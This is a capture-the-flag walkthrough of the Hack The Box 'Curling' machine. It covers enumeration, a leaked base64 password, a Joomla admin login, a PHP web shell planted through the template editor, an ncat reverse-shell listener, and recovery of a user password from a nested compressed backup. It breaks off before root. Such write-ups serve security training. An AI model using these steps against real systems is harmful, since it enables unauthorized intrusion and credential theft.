![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b9ccd082-7a9c-4ca9-bada-0648f6dcf24b)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Mon Jun  5 11:14:29 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80 -Pn 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  5 11:14:44 2023 -- 1 IP address (1 host up) scanned in 15.25 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1ddfff23-0af7-4425-a997-a02d52f8f688)

opening the IP on a browser, we can see that it is running a joomla cms. let's fuzz for hidden dirs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]
└─$ gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -k -x php,txt -b 403,404 2>/dev/null 
===============================================================
Gobuster v3.5                                                                      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.150/              
[+] Method:                  GET                                                   
[+] Threads:                 10                                                    
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt                                                                                                      
[+] Negative Status codes:   403,404                                               
[+] User Agent:              gobuster/3.5                                       
[+] Extensions:              php,txt                                                                                                                                   
[+] Timeout:                 10s                                                   
===============================================================                  
2023/06/05 11:34:54 Starting gobuster in directory enumeration mode                
===============================================================
/administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]
/bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]     
/cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]  
/components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]
/configuration.php    (Status: 200) [Size: 0]    
/images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/]
/index.php            (Status: 200) [Size: 14264]                                 
/index.php            (Status: 200) [Size: 14264]
/language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/]
/layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]                                                                                     
/libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]
/modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]
/plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]
/README.txt           (Status: 200) [Size: 4872]               
/secret.txt           (Status: 200) [Size: 17]
/templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]
/tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]
/web.config.txt       (Status: 200) [Size: 1690]

===============================================================
2023/06/05 11:38:25 Finished
===============================================================
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7aee6e87-aece-4b9c-a075-0b8f3b8753af)

chcking out the `/secret.txt`... found an encoded text `Q3VybGluZzIwMTgh` decoded from base64 to `Curling2018!`.  looks like a potential password.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dcff2d8d-deab-4198-a90f-acb5b66ccb9a)

checking the posts, we can see a potential username `floris`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d3909f54-67e2-4b48-98b5-d187e8b2dd5d)

let's try login administrator with this creds `floris:Curling2018!`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6f6a7a2b-e29c-4404-be89-4a0962ebdcf4)

Bull's eye. we are in as admin, let's play around to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/59f64fd5-3708-4e09-accf-7bb3fa7fad1e)

navigate to the extension panel and create a php web shell. let's locate this shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cb19512e-2354-4ce7-99be-e60ea4b605e4)

cool let's pop a reverse shell.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]
└─$ ncat -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.150.
Ncat: Connection from 10.10.10.150:48836.
bash: cannot set terminal process group (1318): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/protostar/html$
```
boom we are in. let's escalate privs.


## Privilege Escalation

```
www-data@curling:/home/floris$ ls -al
total 44
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Jun  5 10:04 user.txt
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$
```
in floris home dir, saw a password_backup file. trying to read the content got to see it an hexdump of a bzip2 file. let's repair it,

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]   
└─$ cat password_backup | xxd -r > passwd.bz2                 
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]                            
└─$ file passwd.bz2                                                                
passwd.bz2: bzip2 compressed data, block size = 900k                               
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]                            
└─$ bunzip2 -k passwd.bz2                                                          
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]
└─$ ls -al                                                                         
total 32                                                                                                                                                               
drwxr-xr-x  2 n16hth4wk n16hth4wk 4096 Jun  5 14:22 .
drwxr-xr-x 40 n16hth4wk n16hth4wk 4096 Jun  5 11:02 .. 
-rw-r--r--  1 n16hth4wk n16hth4wk 1389 Jun  5 11:30 curling.txt                    
-rw-r--r--  1 n16hth4wk n16hth4wk  646 Jun  5 11:13 fulltcp.txt
-rw-r--r--  1 n16hth4wk n16hth4wk  872 Jun  5 11:14 normal.txt
-rw-r--r--  1 n16hth4wk n16hth4wk  173 Jun  5 14:22 passwd                      
-rw-r--r--  1 n16hth4wk n16hth4wk  244 Jun  5 14:22 passwd.bz2                                                                                                         
-rw-r--r--  1 n16hth4wk n16hth4wk 1076 Jun  5 13:12 password_backup   
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]
└─$ file passwd                                                                    
passwd: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]         
└─$ mv passwd.gz passwd.gzip                                                        
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]     
└─$ binwalk -e passwd.gzip
                                                                                                                                                                       
DECIMAL       HEXADECIMAL     DESCRIPTION                                                                                                                              
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, has original file name: "password", from Unix, last modified: 2018-05-22 19:16:20                                  
24            0x18            bzip2 compressed data, block size = 900k             
                                                                                   
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling]                            
└─$ cd _passwd.gzip.extracted                                                                                                                                          
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]     
└─$ ls -al                                                                                                                                                             
total 28                                                                           
drwxr-xr-x 2 n16hth4wk n16hth4wk  4096 Jun  5 14:23 .                              
drwxr-xr-x 3 n16hth4wk n16hth4wk  4096 Jun  5 14:23 ..                                                                                                                 
-rw------- 1 n16hth4wk n16hth4wk 10240 Jun  5 14:23 18
-rw-r--r-- 1 n16hth4wk n16hth4wk   141 Jun  5 14:23 password
-rw-r--r-- 1 n16hth4wk n16hth4wk   173 Jun  5 14:23 password.gz                    
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]
└─$ file passwd                                                                    
passwd: cannot open `passwd' (No such file or directory)                                                                                                               
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]     
└─$ file password                                                                  
password: bzip2 compressed data, block size = 900k                                 
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]     
└─$ file password.gz                                                               
password.gz: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141                                   
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]
└─$ file 18                                                                                                                                                            
18: POSIX tar archive (GNU)                                                        
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]     
└─$ mv 18 18.tar  

┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]     
└─$ tar -xf 18.tar                                                                 
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]                                                        
└─$ ls -al                                                                         
total 32                                                                           
drwxr-xr-x 2 n16hth4wk n16hth4wk  4096 Jun  5 14:24 .                              
drwxr-xr-x 3 n16hth4wk n16hth4wk  4096 Jun  5 14:23 ..                             
-rw------- 1 n16hth4wk n16hth4wk 10240 Jun  5 14:23 18.tar                             
-rw-r--r-- 1 n16hth4wk n16hth4wk   141 Jun  5 14:23 password                       
-rw-r--r-- 1 n16hth4wk n16hth4wk   173 Jun  5 14:23 password.gz                    
-rw-r--r-- 1 n16hth4wk n16hth4wk    19 May 22  2018 password.txt                                                                                                       
                                                                                   
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Curling/_passwd.gzip.extracted]
└─$ cat password.txt                                                                                                                                                   
5d<wdCbdZu)|hChXll
```
after repairing the file, we got to extract the password `5d<wdCbdZu)|hChXll`. let's su user `floris` with this password.

```
www-data@curling:/home/floris$ su floris
Password: 
floris@curling:~$ sudo -l
[sudo] password for floris: 
Sorry, user floris may not run sudo on curling.
floris@curling:~$
```
cool we are in as user `floris`... checking for sudo permission, we don't have permission to sudo. let's escalate further.




